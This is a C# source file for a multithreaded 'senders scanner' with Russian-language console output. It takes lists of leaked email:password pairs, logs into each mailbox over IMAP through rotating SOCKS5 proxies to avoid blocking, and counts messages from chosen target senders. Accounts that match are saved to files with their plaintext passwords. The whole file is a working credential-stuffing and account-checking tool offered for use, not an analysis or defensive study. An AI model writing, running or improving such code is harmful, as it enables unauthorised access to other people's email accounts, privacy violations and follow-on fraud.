using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using MailKit;
using MailKit.Net.Imap;
using MailKit.Net.Proxy;
using MailKit.Security;
using MailKit.Search;
using MimeKit;

namespace opentask
{
    public class SendersScanner
    {
        private string accountsFile;
        private string sendersFile;
        private string validAccountsFolder;
        private ProxyManager proxyManager;
        private int maxThreads;
        private int connectTimeout;
        private bool proxyEnabled;
        
        private int totalAccounts = 0;
        private int processedAccounts = 0;
        private int validAccounts = 0;
        private int foundMessages = 0;
        private DateTime scanStartTime;
        private CancellationTokenSource? cancellationTokenSource;
        private object consoleLock = new object();
        private bool isScanning = false;

        public SendersScanner(string accountsPath, string sendersPath, string validFolder, ProxyManager proxies, int threads, int timeout, bool useProxies)
        {
            accountsFile = accountsPath;
            sendersFile = sendersPath;
            validAccountsFolder = validFolder;
            proxyManager = proxies;
            maxThreads = threads;
            connectTimeout = timeout;
            proxyEnabled = useProxies;
            
            if (!Directory.Exists(validAccountsFolder))
            {
                Directory.CreateDirectory(validAccountsFolder);
            }
        }

        public async Task StartScan()
        {
            if (!File.Exists(accountsFile) || !File.Exists(sendersFile))
            {
                UI.WriteLine("Файлы accounts.txt или senders.txt не найдены!", ConsoleColor.Red);
                UI.WaitKey("Нажмите любую клавишу для возврата...");
                return;
            }

            var accounts = File.ReadAllLines(accountsFile)
                .Select(line => line.Trim())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToList();

            var targetSenders = File.ReadAllLines(sendersFile)
                .Select(line => line.Trim().ToLowerInvariant())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToHashSet();

            totalAccounts = accounts.Count;
            processedAccounts = 0;
            validAccounts = 0;
            foundMessages = 0;
            isScanning = true;
            scanStartTime = DateTime.Now;
            cancellationTokenSource = new CancellationTokenSource();

            var progressTask = ShowScanProgress();
            
            var semaphore = new SemaphoreSlim(maxThreads);
            var tasks = accounts.Select(account => ProcessAccount(account, targetSenders, semaphore, cancellationTokenSource.Token)).ToList();
            
            await Task.WhenAll(tasks);
            
            isScanning = false;
            await progressTask;

            Console.WriteLine("\n✅ Сканер завершил работу!");
            Console.WriteLine($"Всего обработано: {processedAccounts}, валидных: {validAccounts}, найдено сообщений: {foundMessages}");
            UI.WaitKey("Нажмите любую клавишу для возврата в меню...");
        }

        private async Task ProcessAccount(string accountLine, HashSet<string> targetSenders, SemaphoreSlim semaphore, CancellationToken ct)
        {
            await semaphore.WaitAsync(ct);
            try
            {
                var parts = accountLine.Split(':');
                if (parts.Length < 2)
                {
                    Interlocked.Increment(ref processedAccounts);
                    return;
                }

                var email = parts[0].Trim();
                var password = parts[1].Trim();
                var domain = email.Split('@').Last();

                string? proxy = null;
                if (proxyEnabled)
                {
                    proxy = proxyManager.GetNextProxy();
                }

                var connectionResult = await TryConnectWithRetry(email, password, domain, proxy, ct);
                if (connectionResult.Success && connectionResult.Client != null)
                {
                    Interlocked.Increment(ref validAccounts);
                    
                    var found = await ScanForTargetSenders(connectionResult.Client, targetSenders, ct);
                    if (found > 0)
                    {
                        Interlocked.Add(ref foundMessages, found);
                        SaveValidAccount(email, password, found, targetSenders);
                    }

                    await connectionResult.Client.DisconnectAsync(true, ct);
                }
                else
                {
                    // Если подключение не удалось и используется прокси - помечаем его как мертвый
                    if (proxy != null)
                    {
                        proxyManager.MarkProxyAsDead(proxy);
                    }
                }
            }
            catch
            {
                // Игнорируем ошибки для стабильности
            }
            finally
            {
                Interlocked.Increment(ref processedAccounts);
                semaphore.Release();
            }
        }

        private async Task<(bool Success, ImapClient? Client)> TryConnectWithRetry(string email, string password, string domain, string? proxy, CancellationToken ct)
        {
            List<(string Server, int Port, bool UseSsl)> serversToTry = ImapHelper.GetImapServersForDomain(domain);

            foreach (var server in serversToTry)
            {
                if (ct.IsCancellationRequested) break;
                
                try
                {
                    var client = new ImapClient();
                    
                    // Подключаем прокси если он передан
                    if (!string.IsNullOrEmpty(proxy))
                    {
                        try
                        {
                            // Парсим строку прокси (формат socks5://host:port или host:port)
                            string cleanProxy = proxy;
                            if (cleanProxy.StartsWith("socks5://", StringComparison.OrdinalIgnoreCase))
                            {
                                cleanProxy = cleanProxy.Substring(9);
                            }
                            
                            var proxyParts = cleanProxy.Split(':');
                            if (proxyParts.Length >= 2 && int.TryParse(proxyParts[1], out int proxyPort))
                            {
                                string proxyHost = proxyParts[0];
                                // Для прокси с авторизацией (если есть логин:пароль@хост:порт)
                                if (proxyHost.Contains('@'))
                                {
                                    var authParts = proxyHost.Split('@');
                                    proxyHost = authParts[authParts.Length - 1];
                                }
                                
                                // Инициализируем SOCKS5 прокси клиент
                                client.ProxyClient = new MailKit.Net.Proxy.Socks5Client(proxyHost, proxyPort);
                                Console.WriteLine($"[PROXY] {email} подключается к {server.Server}:{server.Port} через прокси {proxyHost}:{proxyPort}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[PROXY_ERROR] Ошибка инициализации прокси {proxy} для {email}: {ex.Message}");
                        }
                    }
                    
                    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(connectTimeout));
                    Console.WriteLine($"[CONNECT] Пытаемся подключиться к {email} через {server.Server}:{server.Port}");
                    await client.ConnectAsync(server.Server, server.Port, server.UseSsl, cts.Token);
                    Console.WriteLine($"[CONNECT] Успешное подключение к {server.Server} для {email}");
                    
                    await client.AuthenticateAsync(email, password, cts.Token);
                    Console.WriteLine($"[AUTH] Успешная авторизация {email}");
                    
                    return (true, client);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[ERROR] Ошибка подключения к {email} через {server.Server}: {ex.Message}");
                    if (ex.InnerException != null)
                    {
                        Console.WriteLine($"[ERROR] Внутренняя ошибка: {ex.InnerException.Message}");
                    }
                    continue;
                }
            }

            Console.WriteLine($"[FAIL] Не удалось подключиться к аккаунту {email} ни к одному из серверов");
            return (false, null);
        }

        private async Task<int> ScanForTargetSenders(ImapClient client, HashSet<string> targetSenders, CancellationToken ct)
        {
            int totalFound = 0;
            
            try
            {
                var inbox = client.Inbox;
                if (!inbox.IsOpen)
                    await inbox.OpenAsync(FolderAccess.ReadOnly, ct);

                var last1000 = inbox.Search(SearchQuery.All);
                if (last1000.Count > 1000)
                    last1000 = last1000.Skip(last1000.Count - 1000).ToList();

                var messages = await inbox.FetchAsync(last1000, MessageSummaryItems.Envelope, ct);
                
                foreach (var msg in messages)
                {
                    if (ct.IsCancellationRequested) break;
                    
                    if (msg.Envelope?.From != null)
                    {
                        foreach (var addr in msg.Envelope.From)
                        {
                            if (addr is MailboxAddress mailboxAddr && 
                                !string.IsNullOrWhiteSpace(mailboxAddr.Address) && 
                                targetSenders.Contains(mailboxAddr.Address.ToLowerInvariant()))
                            {
                                totalFound++;
                            }
                        }
                    }
                }

                await inbox.CloseAsync(false, ct);
            }
            catch
            {
                // Игнорируем ошибки
            }

            return totalFound;
        }

        private void SaveValidAccount(string email, string password, int foundCount, HashSet<string> targetSenders)
        {
            var filePath = Path.Combine(validAccountsFolder, $"{email.Replace("@", "_").Replace(".", "_")}.txt");
            var content = $"Email: {email}\nPassword: {password}\nНайдено сообщений от целевых отправителей: {foundCount}\n";
            content += "Целевые отправители:\n" + string.Join("\n", targetSenders);
            
            File.WriteAllText(filePath, content);
        }

        private async Task ShowScanProgress()
        {
            var lastUpdate = DateTime.Now;
            
            while (isScanning)
            {
                Console.Clear();
                UI.DrawHeader("🎯 SENDERS SCANNER", "Проверка аккаунтов на целевых отправителей", 80);
                
                var progress = totalAccounts > 0 ? (double)processedAccounts / totalAccounts * 100 : 0;
                var elapsed = DateTime.Now - scanStartTime;
                var overallSpeed = processedAccounts > 0 ? processedAccounts / elapsed.TotalSeconds : 0;
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"┌{new string('─', 78)}┐");
                Console.WriteLine($"│ Прогресс: {progress,5:F1}% │ Обработано: {processedAccounts,6:N0} из {totalAccounts,6:N0} │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"│ Валидных: {validAccounts,6:N0} │ Найдено писем: {foundMessages,6:N0} │ Скорость: {overallSpeed,5:F1}/сек │");
                Console.ResetColor();
                
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine($"└{new string('─', 78)}┘");
                Console.ResetColor();
                
                Console.WriteLine();
                int barSize = 60;
                int filledSize = (int)(progress / 100 * barSize);
                string bar = "";
                for (int i = 0; i < barSize; i++)
                {
                    bar += i < filledSize ? "█" : "░";
                }
                Console.Write($"[{bar}] {progress:F1}%");
                Console.WriteLine("\n\n[ESC] - Остановить сканирование");

                if (Console.KeyAvailable)
                {
                    var key = Console.ReadKey(true);
                    if (key.Key == ConsoleKey.Escape)
                    {
                        cancellationTokenSource?.Cancel();
                        return;
                    }
                }

                await Task.Delay(500);
            }
        }
    }
}